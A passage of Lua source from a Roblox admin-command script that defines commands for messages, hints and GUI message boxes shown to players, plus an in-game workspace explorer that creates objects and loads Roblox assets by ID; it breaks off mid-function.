CoolCMDs.Functions.CreateCommand({"message.", "msg.", "mes.", "m."}, 4, function(Message, MessageSplit, Speaker, Self)
for i = 1, #MessageSplit do
CoolCMDs.Functions.CreateMessage("Message", Speaker.Name.. ": " ..MessageSplit[i], 5)
wait(5)
end
end, "Message", "Creates a message in the Workspace.", "line 1" ..CoolCMDs.Data.SplitCharacter.. "line 2" ..CoolCMDs.Data.SplitCharacter.. "[...]")

CoolCMDs.Functions.CreateCommand({"messagebox", "mb"}, 1, function(Message, MessageSplit, Speaker, Self)
if CoolCMDs.Functions.IsModuleEnabled("GuiSupport") == false then
CoolCMDs.Functions.CreateMessage("Hint", "This command requires the GuiSupport module to be enabled.", 5, Speaker)
return
elseif CoolCMDs.Functions.GetModule("GuiSupport") == nil then
CoolCMDs.Functions.CreateMessage("Hint", "This command requires the GuiSupport module to be installed.", 5, Speaker)
return
end
for _, Player in pairs(game:service("Players"):GetPlayers()) do
coroutine.wrap(function()
if Player:FindFirstChild("PlayerGui") == nil then return end
local Gui = Instance.new("ScreenGui")
Gui.Parent = Player.PlayerGui
local function WindowExitFunction(Window)
CoolCMDs.Functions.GetModule("GuiSupport").WindowEffect(Window, 2)
Gui:Remove()
end
local Window = CoolCMDs.Functions.GetModule("GuiSupport").WindowCreate(UDim2.new(0, 0, 0, 0), UDim2.new(0, 300, 0, 125), Gui, "Message", true, true, true, true, false, false, true, WindowExitFunction)
local ImageLabel = Instance.new("ImageLabel")
ImageLabel.Size = UDim2.new(0, 64, 0, 64)
ImageLabel.Position = UDim2.new(0, 5, 0, 5)
ImageLabel.BorderSizePixel = 0
ImageLabel.BackgroundTransparency = 1
ImageLabel.Changed:connect(function(Property) if Property == "BackgroundTransparency" and ImageLabel.BackgroundTransparency ~= 1 then ImageLabel.BackgroundTransparency = 1 end end)
ImageLabel.Parent = Window.Content
if MessageSplit[1]:lower() == "prompt" then
ImageLabel.Image = "http://www.Roblox.com/Asset/?id=41363872"
Window.Icon.Image = ImageLabel.Image
Window.TitleBar.Text = "Prompt"
elseif MessageSplit[1]:lower() == "warning" then
ImageLabel.Image = "http://www.Roblox.com/Asset/?id=41363725"
Window.Icon.Image = ImageLabel.Image
Window.TitleBar.Text = "Warning"
elseif MessageSplit[1]:lower() == "error" then
ImageLabel.Image = "http://www.Roblox.com/Asset/?id=41364113"
Window.Icon.Image = ImageLabel.Image
Window.TitleBar.Text = "Error"
elseif MessageSplit[1]:lower() == "fatal" or MessageSplit[1]:lower() == "fatal error" then
ImageLabel.Image = "http://www.Roblox.com/Asset/?id=41364113"
Window.Icon.Image = ImageLabel.Image
Window.TitleBar.Text = "Fatal Error"
elseif tonumber(MessageSplit[1]) ~= nil then
ImageLabel.Image = "http://www.Roblox.com/Asset/?id=" ..tonumber(MessageSplit[1])
Window.Icon.Image = ImageLabel.Image
else
ImageLabel:Remove()
ImageLabel = nil
end
for i = ImageLabel ~= nil and 2 or 1, #MessageSplit do
local TextLabel = Instance.new("TextLabel")
TextLabel.Text = string.rep(" ", 6) .. MessageSplit[i]
TextLabel.BackgroundColor3 = Window.Content.BackgroundColor3
TextLabel.BorderSizePixel = 0
TextLabel.Changed:connect(function(Property) if Property == "BackgroundTransparency" and TextLabel.BackgroundTransparency ~= 1 then TextLabel.BackgroundTransparency = 1 end end)
TextLabel.TextColor3 = Color3.new(0, 0, 0)
TextLabel.TextXAlignment = "Left"
TextLabel.Size = UDim2.new(1, (i <= 5 and ImageLabel ~= nil) and -74 or 0, 0, 15)
TextLabel.Position = UDim2.new(0, (i <= 5 and ImageLabel ~= nil) and 74 or 0, 0, ((i - 1) * 15))
TextLabel.Parent = Window.Content
if string.len(MessageSplit[i]) * 8 > Window.Size.X.Offset then
Window.Size = UDim2.new(0, string.len(MessageSplit[i]) * 8, 0, Window.Size.Y.Offset + 15)
else
Window.Size = UDim2.new(0, Window.Size.X.Offset, 0, Window.Size.Y.Offset + 15)
end
end
local TextButton = Instance.new("TextButton")
TextButton.Text = "OK"
TextButton.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
TextButton.BorderColor3 = Color3.new(0, 0, 0)
TextButton.BorderSizePixel = 1
TextButton.TextColor3 = Color3.new(0, 0, 0)
TextButton.Size = UDim2.new(0, 80, 0, 35)
TextButton.Position = UDim2.new(0.5, -40, 1, -50)
TextButton.Parent = Window.Content
TextButton.MouseButton1Up:connect(function() WindowExitFunction(Window) end)
Window.Position = UDim2.new(0.5, -Window.Size.X.Offset / 2, 0.5, -Window.Size.Y.Offset / 2)
end)()
end
end, "Message Box", "Creates a GUI message box in all players.", "[prompt, warning, error, [fatal, fatal error]" ..CoolCMDs.Data.SplitCharacter.. "] line 1" ..CoolCMDs.Data.SplitCharacter.. "line 2" ..CoolCMDs.Data.SplitCharacter.. "[...]")

CoolCMDs.Functions.CreateCommand({"hintplayer", "hp"}, 1, function(Message, MessageSplit, Speaker, Self)
if #MessageSplit <= 1 then return false end
for _, Player in pairs(game:service("Players"):GetPlayers()) do
if string.match(Player.Name:lower(), MessageSplit[1]:lower()) then
coroutine.wrap(function()
for i = 2, #MessageSplit do
CoolCMDs.Functions.CreateMessage("Hint", Speaker.Name.. ": " ..MessageSplit[i], 5, Player)
wait(5)
end
end)()
end
end
end, "Hint (Player)", "Creates a hint in a player.", "player" ..CoolCMDs.Data.SplitCharacter.. "line 1" ..CoolCMDs.Data.SplitCharacter.. "line 2" ..CoolCMDs.Data.SplitCharacter.. "[...]")

CoolCMDs.Functions.CreateCommand({"messageplayer", "mp"}, 1, function(Message, MessageSplit, Speaker, Self)
if #MessageSplit <= 1 then return false end
for _, Player in pairs(game:service("Players"):GetPlayers()) do
if string.match(Player.Name:lower(), MessageSplit[1]:lower()) then
coroutine.wrap(function()
for i = 2, #MessageSplit do
CoolCMDs.Functions.CreateMessage("Message", Speaker.Name.. ": " ..MessageSplit[i], 5, Player)
wait(5)
end
end)()
end
end
end, "Message (Player)", "Creates a message in a player.", "player" ..CoolCMDs.Data.SplitCharacter.. "line 1" ..CoolCMDs.Data.SplitCharacter.. "line 2" ..CoolCMDs.Data.SplitCharacter.. "[...]")

CoolCMDs.Functions.CreateCommand({"messageboxplayer", "mbp"}, 1, function(Message, MessageSplit, Speaker, Self)
if #MessageSplit <= 1 then return false end
if CoolCMDs.Functions.IsModuleEnabled("GuiSupport") == false then
CoolCMDs.Functions.CreateMessage("Hint", "This command requires the GuiSupport module to be enabled.", 5, Speaker)
return
elseif CoolCMDs.Functions.GetModule("GuiSupport") == nil then
CoolCMDs.Functions.CreateMessage("Hint", "This command requires the GuiSupport module to be installed.", 5, Speaker)
return
end
for _, Player in pairs(game:service("Players"):GetPlayers()) do
if string.match(Player.Name:lower(), MessageSplit[1]:lower()) then
coroutine.wrap(function()
if Player:FindFirstChild("PlayerGui") == nil then return end
local Gui = Instance.new("ScreenGui")
Gui.Parent = Player.PlayerGui
local function WindowExitFunction(Window)
CoolCMDs.Functions.GetModule("GuiSupport").WindowEffect(Window, 2)
Gui:Remove()
end
local Window = CoolCMDs.Functions.GetModule("GuiSupport").WindowCreate(UDim2.new(0, 0, 0, 0), UDim2.new(0, 300, 0, 125), Gui, "Message", true, true, true, true, false, false, true, WindowExitFunction)
local ImageLabel = Instance.new("ImageLabel")
ImageLabel.Size = UDim2.new(0, 64, 0, 64)
ImageLabel.Position = UDim2.new(0, 5, 0, 5)
ImageLabel.BorderSizePixel = 0
ImageLabel.BackgroundTransparency = 1
ImageLabel.Changed:connect(function(Property) if Property == "BackgroundTransparency" and ImageLabel.BackgroundTransparency ~= 1 then ImageLabel.BackgroundTransparency = 1 end end)
ImageLabel.Parent = Window.Content
if MessageSplit[2]:lower() == "prompt" then
ImageLabel.Image = "http://www.Roblox.com/Asset/?id=41363872"
Window.Icon.Image = ImageLabel.Image
Window.TitleBar.Text = "Prompt"
elseif MessageSplit[2]:lower() == "warning" then
ImageLabel.Image = "http://www.Roblox.com/Asset/?id=41363725"
Window.Icon.Image = ImageLabel.Image
Window.TitleBar.Text = "Warning"
elseif MessageSplit[2]:lower() == "error" then
ImageLabel.Image = "http://www.Roblox.com/Asset/?id=41364113"
Window.Icon.Image = ImageLabel.Image
Window.TitleBar.Text = "Error"
elseif MessageSplit[2]:lower() == "fatal" or MessageSplit[2]:lower() == "fatal error" then
ImageLabel.Image = "http://www.Roblox.com/Asset/?id=41364113"
Window.Icon.Image = ImageLabel.Image
Window.TitleBar.Text = "Fatal Error"
elseif tonumber(MessageSplit[2]) ~= nil then
ImageLabel.Image = "http://www.Roblox.com/Asset/?id=" ..tonumber(MessageSplit[2])
Window.Icon.Image = ImageLabel.Image
else
ImageLabel:Remove()
ImageLabel = nil
end
for i = ImageLabel ~= nil and 3 or 2, #MessageSplit do
local TextLabel = Instance.new("TextLabel")
TextLabel.Text = string.rep(" ", 6) .. MessageSplit[i]
TextLabel.BackgroundColor3 = Window.Content.BackgroundColor3
TextLabel.BorderSizePixel = 0
TextLabel.Changed:connect(function(Property) if Property == "BackgroundTransparency" and TextLabel.BackgroundTransparency ~= 1 then TextLabel.BackgroundTransparency = 1 end end)
TextLabel.TextColor3 = Color3.new(0, 0, 0)
TextLabel.TextXAlignment = "Left"
TextLabel.Size = UDim2.new(1, (i <= 6 and ImageLabel ~= nil) and -74 or 0, 0, 15)
TextLabel.Position = UDim2.new(0, (i <= 6 and ImageLabel ~= nil) and 74 or 0, 0, ((i - 2) * 15))
TextLabel.Parent = Window.Content
if string.len(MessageSplit[i]) * 8 > Window.Size.X.Offset then
Window.Size = UDim2.new(0, string.len(MessageSplit[i]) * 8, 0, Window.Size.Y.Offset + 15)
else
Window.Size = UDim2.new(0, Window.Size.X.Offset, 0, Window.Size.Y.Offset + 15)
end
end
local TextButton = Instance.new("TextButton")
TextButton.Text = "OK"
TextButton.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
TextButton.BorderColor3 = Color3.new(0, 0, 0)
TextButton.BorderSizePixel = 1
TextButton.TextColor3 = Color3.new(0, 0, 0)
TextButton.Size = UDim2.new(0, 80, 0, 35)
TextButton.Position = UDim2.new(0.5, -40, 1, -50)
TextButton.Parent = Window.Content
TextButton.MouseButton1Up:connect(function() WindowExitFunction(Window) end)
Window.Position = UDim2.new(0.5, -Window.Size.X.Offset / 2, 0.5, -Window.Size.Y.Offset / 2)
end)()
end
end
end, "Message Box (Player)", "Creates a GUI message box in a player.", "player" ..CoolCMDs.Data.SplitCharacter.. "[prompt, warning, error, [fatal, fatal error]" ..CoolCMDs.Data.SplitCharacter.. "] line 1" ..CoolCMDs.Data.SplitCharacter.. "line 2" ..CoolCMDs.Data.SplitCharacter.. "[...]")

CoolCMDs.Functions.CreateCommand("workspace", 4, function(Message, MessageSplit, Speaker, Self)
if CoolCMDs.Functions.IsModuleEnabled("GuiSupport") == false then
CoolCMDs.Functions.CreateMessage("Hint", "This command requires the GuiSupport module to be enabled.", 5, Speaker)
return
elseif CoolCMDs.Functions.GetModule("GuiSupport") == nil then
CoolCMDs.Functions.CreateMessage("Hint", "This command requires the GuiSupport module to be installed.", 5, Speaker)
return
end
for i = 1, #MessageSplit do
for _, Player in pairs(game:service("Players"):GetPlayers()) do
if string.match(Player.Name:lower(), MessageSplit[i]:lower()) and Player:FindFirstChild("PlayerGui") ~= nil then
coroutine.wrap(function()
local Object = game:service("Workspace")
local ObjectChildren = Object:children()
local SortType = 1
local Home = game
local Gui = Instance.new("ScreenGui")
Gui.Parent = Player.PlayerGui
local function WindowExitFunction(Frame)
Object = nil
UpdatePage = nil
CoolCMDs.Functions.GetModule("GuiSupport").WindowEffect(Frame, 2)
Frame:Remove()
end
local Window = CoolCMDs.Functions.GetModule("GuiSupport").WindowCreate(UDim2.new(0.5, -550 / 2, 0.5, -355 / 2), UDim2.new(0, 550, 0, 355), Gui, "Explorer v1.7", true, true, true, true, true, true, true, WindowExitFunction, UDim2.new(0, 550, 0, 355))
Window.Changed:connect(function(Property)
if Property == "Parent" then
if Window.Parent == nil then
wait(2)
Gui:Remove()
end
end
end)
Window.Icon.Image = "http://www.Roblox.com/Asset/?id=43504783"
local Previous = Instance.new("TextButton")
Previous.Name = "Previous"
Previous.Text = "<"
Previous.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
Previous.BorderColor3 = Color3.new(0, 0, 0)
Previous.BorderSizePixel = 1
Previous.TextColor3 = Color3.new(0, 0, 0)
Previous.Size = UDim2.new(0, 20, 0, 20)
Previous.Position = UDim2.new(0, 5, 1, -25)
Previous.Parent = Window.Content
local Center = Instance.new("TextLabel")
Center.Name = "Center"
Center.Text = "0 to 0 of 0"
Center.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
Center.BorderColor3 = Color3.new(0, 0, 0)
Center.BorderSizePixel = 1
Center.TextColor3 = Color3.new(0, 0, 0)
Center.FontSize = "Size14"
Center.Size = UDim2.new(1, -50, 0, 20)
Center.Position = UDim2.new(0, 25, 1, -25)
Center.Parent = Window.Content
local Next = Instance.new("TextButton")
Next.Text = ">"
Next.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
Next.BorderColor3 = Color3.new(0, 0, 0)
Next.BorderSizePixel = 1
Next.TextColor3 = Color3.new(0, 0, 0)
Next.Size = UDim2.new(0, 20, 0, 20)
Next.Position = UDim2.new(1, -25, 1, -25)
Next.Parent = Window.Content
local ListFrameHeader = CoolCMDs.Functions.GetModule("GuiSupport").WindowControls.ListFrame.New()
ListFrameHeader.Size = UDim2.new(1, -10, 0, 20)
ListFrameHeader.Position = UDim2.new(0, 5, 0, 25)
ListFrameHeader.Parent = Window.Content
CoolCMDs.Functions.GetModule("GuiSupport").WindowControls.ListFrame.ListUpdate(ListFrameHeader, {"#\tName\tclassName\tParent"}, 2)
local ListFrame = CoolCMDs.Functions.GetModule("GuiSupport").WindowControls.ListFrame.New()
ListFrame.Size = UDim2.new(1, -10, 1, -70)
ListFrame.Position = UDim2.new(0, 5, 0, 45)
ListFrame.Parent = Window.Content
local function UpdatePage(...)
local List = {}
for i, Part in pairs(ObjectChildren) do
table.insert(List, i.. "\t" ..(Part.Name == "" and "Nil" or Part.Name).. "\t" ..(Part.className == "" and "Nil" or Part.className).. "\t" ..(Part.Parent == nil and "Nil" or Part.Parent.Name))
end
if SortType ~= 1 then
table.sort(List, function(a, b) return string.lower(CoolCMDs.Functions.Explode("\t", a)[SortType]) < string.lower(CoolCMDs.Functions.Explode("\t", b)[SortType]) end)
end
CoolCMDs.Functions.GetModule("GuiSupport").WindowControls.ListFrame.ListUpdate(ListFrame, List, 1, ...)
Center.Text = ListFrame.ListIndex.Value.. " to " ..(ListFrame.ListIndex.Value + #ListFrame:children() - 2).. " of " ..#ObjectChildren
for _, Tag in pairs(ListFrame:children()) do
for _, Table in pairs(Tag:children()) do
pcall(function()
Table.MouseButton1Down:connect(function()
for i, Part in pairs(ObjectChildren) do
if i == tonumber(Tag.Table1.Text) then
Object = Part
ObjectChildren = Object:children()
ListFrame.ListIndex.Value = 1
UpdatePage()
end
end
end)
end)
end
end
end
coroutine.wrap(function()
CoolCMDs.Functions.GetModule("GuiSupport").WindowControls.ListFrame.ListUpdate(ListFrame, {"Loading..."}, 1)
wait(2.5)
UpdatePage()
end)()
for _, Table in pairs(ListFrameHeader.Tag1:children()) do
Table.MouseButton1Down:connect(function()
SortType = tonumber(string.sub(Table.Name, 6))
UpdatePage()
end)
end
Previous.MouseButton1Up:connect(function() UpdatePage(-1, "page") end)
Next.MouseButton1Up:connect(function() UpdatePage(1, "page") end)
local MenuBar1 = Instance.new("Frame")
MenuBar1.Size = UDim2.new(1, 0, 0, 20)
MenuBar1.Position = UDim2.new(0, 0, 0, 0)
MenuBar1.BackgroundColor3 = Color3.new(0.75, 0.75, 0.75)
MenuBar1.BorderSizePixel = 1
MenuBar1.Parent = Window.Content
local Choice = Instance.new("TextButton")
Choice.AutoButtonColor = false
Choice.TextXAlignment = "Left"
Choice.TextColor3 = Color3.new(0, 0, 0)
Choice.BorderColor3 = Color3.new(0.4, 0.4, 0.4)
Choice.BackgroundColor3 = Color3.new(0.75, 0.75, 0.75)
Choice.BorderSizePixel = 0
local ChoiceIcon = Instance.new("ImageLabel")
ChoiceIcon.Size = UDim2.new(0, 16, 0, 16)
ChoiceIcon.Position = UDim2.new(0, 4, 0, 1)
ChoiceIcon.BorderSizePixel = 0
ChoiceIcon.BackgroundTransparency = 1
local ChoiceNewRecent = {"", "Object", true}
local ChoiceNew = Choice:Clone()
ChoiceNew.Text = string.rep(" ", 8).. "New..."
ChoiceNew.Size = UDim2.new(0, 75 - 2, 1, -2)
ChoiceNew.Position = UDim2.new(0, 1, 0, 1)
ChoiceNew.Parent = MenuBar1
ChoiceNew.MouseEnter:connect(function() ChoiceNew.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5) ChoiceNew.BorderSizePixel = 1 end)
ChoiceNew.MouseLeave:connect(function() ChoiceNew.BackgroundColor3 = Color3.new(0.75, 0.75, 0.75) ChoiceNew.BorderSizePixel = 0 end)
ChoiceNew.MouseButton1Down:connect(function() ChoiceNew.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4) end)
ChoiceNew.MouseButton1Up:connect(function() ChoiceNew.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5)
local CanCreate = true
local function WindowExitFunction(Frame)
CanCreate = false
CoolCMDs.Functions.GetModule("GuiSupport").WindowEffect(Frame, 2)
Frame:Remove()
end
local Popup = CoolCMDs.Functions.GetModule("GuiSupport").WindowCreate(UDim2.new(0.5, -200 / 2, 0.5, -250 / 2), UDim2.new(0, 200, 0, 250), Gui, "New Object", true, true, true, false, false, false, true)
Popup.Name = "New Object"
Popup.Icon.Image = "http://www.Roblox.com/Asset/?id=42154070"
local TextLabel = Instance.new("TextLabel")
TextLabel.Text = "Instance (className):"
TextLabel.BorderColor3 = Color3.new(0, 0, 0)
TextLabel.BackgroundTransparency = 1
TextLabel.Changed:connect(function(Property) if Property == "BackgroundTransparency" and TextLabel.BackgroundTransparency ~= 1 then TextLabel.BackgroundTransparency = 1 end end)
TextLabel.Position = UDim2.new(0, 5, 0, 15)
TextLabel.Size = UDim2.new(0, 75, 0, 15)
TextLabel.TextWrap = true
TextLabel.TextXAlignment = "Left"
TextLabel.Parent = Popup.Content
local TextBox = Instance.new("TextBox")
TextBox.Name = "ObjectClassName"
TextBox.Text = ChoiceNewRecent[1]
TextBox.BorderColor3 = Color3.new(0, 0, 0)
TextBox.BackgroundColor3 = Color3.new(1, 1, 1)
TextBox.Position = UDim2.new(0, 85, 0, 15)
TextBox.Size = UDim2.new(0, 100, 0, 15)
TextBox.TextWrap = true
TextBox.TextXAlignment = "Left"
TextBox.Parent = Popup.Content
local TextLabel = Instance.new("TextLabel")
TextLabel.Text = "Name:"
TextLabel.BorderColor3 = Color3.new(0, 0, 0)
TextLabel.BackgroundTransparency = 1
TextLabel.Changed:connect(function(Property) if Property == "BackgroundTransparency" and TextLabel.BackgroundTransparency ~= 1 then TextLabel.BackgroundTransparency = 1 end end)
TextLabel.Position = UDim2.new(0, 5, 0, 45)
TextLabel.Size = UDim2.new(0, 75, 0, 15)
TextLabel.TextWrap = true
TextLabel.TextXAlignment = "Left"
TextLabel.Parent = Popup.Content
local TextBox = Instance.new("TextBox")
TextBox.Name = "ObjectName"
TextBox.Text = ChoiceNewRecent[2]
TextBox.BorderColor3 = Color3.new(0, 0, 0)
TextBox.BackgroundColor3 = Color3.new(1, 1, 1)
TextBox.Position = UDim2.new(0, 85, 0, 45)
TextBox.Size = UDim2.new(0, 100, 0, 15)
TextBox.TextWrap = true
TextBox.TextXAlignment = "Left"
TextBox.Parent = Popup.Content
local TextLabel = Instance.new("TextLabel")
TextLabel.Text = "Archivable:"
TextLabel.BorderColor3 = Color3.new(0, 0, 0)
TextLabel.BackgroundTransparency = 1
TextLabel.Changed:connect(function(Property) if Property == "BackgroundTransparency" and TextLabel.BackgroundTransparency ~= 1 then TextLabel.BackgroundTransparency = 1 end end)
TextLabel.Position = UDim2.new(0, 5, 0, 75)
TextLabel.Size = UDim2.new(0, 75, 0, 15)
TextLabel.TextWrap = true
TextLabel.TextXAlignment = "Left"
TextLabel.Parent = Popup.Content
local CheckBox = CoolCMDs.Functions.GetModule("GuiSupport").WindowControls.CheckBox.New(true)
CheckBox.Name = "ObjectArchivable"
CoolCMDs.Functions.GetModule("GuiSupport").WindowControls.CheckBox.SelectCheckBox(ChoiceNewRecent[3])
CheckBox.Position = UDim2.new(0, 90, 0, 75)
CheckBox.Parent = Popup.Content
local TextButton = Instance.new("TextButton")
TextButton.Text = "Create"
TextButton.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
TextButton.BorderColor3 = Color3.new(0, 0, 0)
TextButton.BorderSizePixel = 1
TextButton.TextColor3 = Color3.new(0, 0, 0)
TextButton.Size = UDim2.new(0, 80, 0, 35)
TextButton.Position = UDim2.new(0.5, -40, 0, 115)
TextButton.Parent = Popup.Content
TextButton.MouseButton1Up:connect(function()
if CanCreate == false then return end
CanCreate = false
local NewObject = {pcall(function() return Instance.new(Popup.Content.ObjectClassName.Text) end)}
if NewObject[1] == true then
NewObject[2].Name = Popup.Content.ObjectName.Text
NewObject[2].archivable = CoolCMDs.Functions.GetModule("GuiSupport").WindowControls.CheckBox.GetCheckBoxState(Popup.Content.ObjectArchivable)
NewObject[2].Parent = Object
if NewObject[2].Parent ~= nil then
pcall(function() NewObject[2].CFrame = Speaker.Character.Torso.CFrame * CFrame.new(0, 6, 0) end)
ChoiceNewRecent = {Popup.Content.ObjectClassName.Text, Popup.Content.ObjectName.Text, CoolCMDs.Functions.GetModule("GuiSupport").WindowControls.CheckBox.GetCheckBoxState(Popup.Content.ObjectArchivable)}
Update()
WindowExitFunction(Popup)
return
else
Popup.StatusBar.Text = "Error: Object removed!"
CanCreate = true
return
end
elseif NewObject[1] == false then
Popup.StatusBar.Text = "Error: Unknown Instance type!"
CanCreate = true
return
end
end)
local TextButton = Instance.new("TextButton")
TextButton.Text = "Cancel"
TextButton.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
TextButton.BorderColor3 = Color3.new(0, 0, 0)
TextButton.BorderSizePixel = 1
TextButton.TextColor3 = Color3.new(0, 0, 0)
TextButton.Size = UDim2.new(0, 80, 0, 35)
TextButton.Position = UDim2.new(0.5, -40, 0, 155)
TextButton.Parent = Popup.Content
TextButton.MouseButton1Up:connect(function()
CanCreate = false
ChoiceNewRecent = {Popup.Content.ObjectClassName.Text, Popup.Content.ObjectName.Text, CoolCMDs.Functions.GetModule("GuiSupport").WindowControls.CheckBox.GetCheckBoxState(Popup.Content.ObjectArchivable)}
WindowExitFunction(Popup)
end)
Popup.Parent = Gui
Window.Changed:connect(function(Property)
if Property == "Parent" then
if Window.Parent == nil then
CanCreate = false
WindowExitFunction(Popup)
end
end
end)
end)
local ChoiceNewIcon = ChoiceIcon:Clone()
ChoiceNewIcon.Image = "http://www.Roblox.com/Asset/?id=42154070"
ChoiceNewIcon.Changed:connect(function(Property) if Property == "BackgroundTransparency" and ChoiceNewIcon.BackgroundTransparency ~= 1 then ChoiceNewIcon.BackgroundTransparency = 1 end end)
ChoiceNewIcon.Parent = ChoiceNew
local ChoiceLoadRecent = "47433"
local ChoiceLoad = Choice:Clone()
ChoiceLoad.Text = string.rep(" ", 8).. "Load..."
ChoiceLoad.Size = UDim2.new(0, 75 - 2, 1, -2)
ChoiceLoad.Position = UDim2.new(0, 75 + 1, 0, 1)
ChoiceLoad.Parent = MenuBar1
ChoiceLoad.MouseEnter:connect(function() ChoiceLoad.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5) ChoiceLoad.BorderSizePixel = 1 end)
ChoiceLoad.MouseLeave:connect(function() ChoiceLoad.BackgroundColor3 = Color3.new(0.75, 0.75, 0.75) ChoiceLoad.BorderSizePixel = 0 end)
ChoiceLoad.MouseButton1Up:connect(function() ChoiceLoad.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4) end)
ChoiceLoad.MouseButton1Down:connect(function() ChoiceLoad.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5)
local CanClose = true
local CanCreate = true
local function WindowExitFunction(Frame)
if CanClose == false then return end
CanCreate = false
CoolCMDs.Functions.GetModule("GuiSupport").WindowEffect(Frame, 2)
Frame:Remove()
end
local Popup = CoolCMDs.Functions.GetModule("GuiSupport").WindowCreate(UDim2.new(0.5, -200 / 2, 0.5, -175 / 2), UDim2.new(0, 200, 0, 175), Gui, "Load from URL", true, true, true, false, false, false, true, WindowExitFunction)
Popup.Name = "Load from URL"
Popup.Icon.Image = "http://www.Roblox.com/Asset/?id=42183533"
coroutine.wrap(function()
while Popup.Parent ~= nil do
if CanClose == false then
pcall(function() Popup.ExitButton.BackgroundColor3 = Color3.new(0.5, 0.25, 0.25) end)
pcall(function() Popup.Content.Cancel.BackgroundColor3 = Color3.new(0.55, 0.55, 0.55) end)
pcall(function() Popup.Content.Cancel.TextColor3 = Color3.new(0.75, 0.75, 0.75) end)
else
pcall(function() Popup.ExitButton.BackgroundColor3 = Color3.new(1, 0, 0) end)
pcall(function() Popup.Content.Cancel.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4) end)
pcall(function() Popup.Content.Cancel.TextColor3 = Color3.new(0, 0, 0) end)
end
if CanCreate == false then
pcall(function() Popup.Content.Load.BackgroundColor3 = Color3.new(0.55, 0.55, 0.55) end)
pcall(function() Popup.Content.Load.TextColor3 = Color3.new(0.75, 0.75, 0.75) end)
else
pcall(function() Popup.Content.Load.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4) end)
pcall(function() Popup.Content.Load.TextColor3 = Color3.new(0, 0, 0) end)
end
wait()
end
end)()
local TextLabel = Instance.new("TextLabel")
TextLabel.Text = "ROBLOX Asset ID:"
TextLabel.BorderColor3 = Color3.new(0, 0, 0)
TextLabel.BackgroundTransparency = 1
TextLabel.Changed:connect(function(Property) if Property == "BackgroundTransparency" and TextLabel.BackgroundTransparency ~= 1 then TextLabel.BackgroundTransparency = 1 end end)
TextLabel.Position = UDim2.new(0, 5, 0, 15)
TextLabel.Size = UDim2.new(0, 75, 0, 15)
TextLabel.TextWrap = true
TextLabel.TextXAlignment = "Left"
TextLabel.Parent = Popup.Content
local TextBox = Instance.new("TextBox")
TextBox.Name = "ID"
TextBox.Text = ChoiceLoadRecent
TextBox.BorderColor3 = Color3.new(0, 0, 0)
TextBox.BackgroundColor3 = Color3.new(1, 1, 1)
TextBox.Position = UDim2.new(0, 85, 0, 15)
TextBox.Size = UDim2.new(0, 100, 0, 15)
TextBox.TextWrap = true
TextBox.TextXAlignment = "Left"
TextBox.Parent = Popup.Content
local TextButton = Instance.new("TextButton")
TextButton.Name = "Load"
TextButton.Text = "Load"
TextButton.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
TextButton.BorderColor3 = Color3.new(0, 0, 0)
TextButton.BorderSizePixel = 1
TextButton.TextColor3 = Color3.new(0, 0, 0)
TextButton.Size = UDim2.new(0, 80, 0, 35)
TextButton.Position = UDim2.new(0.5, -40, 0, 45)
TextButton.Parent = Popup.Content
TextButton.MouseButton1Up:connect(function()
if CanCreate == false then return end
if Popup.Content.ID.Text == "" or Popup.Content.ID.Text == nil or tonumber(Popup.Content.ID.Text) == nil then
CanClose = true
CanCreate = true
Popup.StatusBar.Text = "Asset \"" ..Popup.Content.ID.Text.. "\" invalid!"
return
end
CanClose = false
CanCreate = false
Popup.StatusBar.Text = "Preparing InsertService..."
pcall(function() game:service("InsertService"):SetAssetUrl("http://www.Roblox.com/Asset/?id=%d") end)
Popup.StatusBar.Text = "Loading asset \"" ..Popup.Content.ID.Text.. "\"..."
local NewObject = game:service("InsertService"):LoadAsset(tonumber(Popup.Content.ID.Text))
Popup.StatusBar.Text = "Compiling asset \"" ..Popup.Content.ID.Text.. "\"..."
for i = 0, 100 do
if NewObject ~= nil then break end
wait()
end
if NewObject:IsA("Model") then
NewObject.Parent = Object
if NewObject.Parent ~= nil then
NewObject:MakeJoints()
if Speaker.Character ~= nil then
if Speaker.Character:FindFirstChild("Torso") ~= nil then
NewObject:MoveTo((Speaker.Character.Torso.CFrame * CFrame.new(0, 0, -10)).p)
else
NewObject:MoveTo(Vector3.new(0, 10, 0))
end
else
NewObject:MoveTo(Vector3.new(0, 10, 0))
end
Popup.StatusBar.Text = "Asset \"" ..Popup.Content.ID.Text.. "\" loaded successfully."
ObjectChildren = Object:children()
UpdatePage()
ChoiceLoadRecent = Popup.Content.ID.Text
CanClose = true
WindowExitFunction(Popup)
return
else
Popup.StatusBar.Text = "Error: Object removed!"
pcall(function() NewObject:Remove() end)
CanClose = true
CanCreate = true
return
end
else
Popup.StatusBar.Text = "Error: Load timed out!"
pcall(function() NewObject:Remove() end)
CanClose = true
CanCreate = true
return
end
end)
local TextButton = Instance.new("TextButton")
TextButton.Name = "Cancel"
TextButton.Text = "Cancel"
TextButton.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
TextButton.BorderColor3 = Color3.new(0, 0, 0)
TextButton.BorderSizePixel = 1
TextButton.TextColor3 = Color3.new(0, 0, 0)
TextButton.Size = UDim2.new(0, 80, 0, 35)
TextButton.Position = UDim2.new(0.5, -40, 0, 85)
TextButton.Parent = Popup.Content
TextButton.MouseButton1Up:connect(function()
if CanClose == false then return end
CanCreate = false
ChoiceLoadRecent = Popup.Content.ID.Text
WindowExitFunction(Popup)
end)
Popup.Parent = Gui
Window.Changed:connect(function(Property)
if Property == "Parent" then
if Window.Parent == nil then
CanCreate = false
while CanClose == false do wait() end
WindowExitFunction(Popup)
end
end
end)
end)
local ChoiceLoadIcon = ChoiceIcon:Clone()
ChoiceLoadIcon.Image = "http://www.Roblox.com/Asset/?id=42183533"
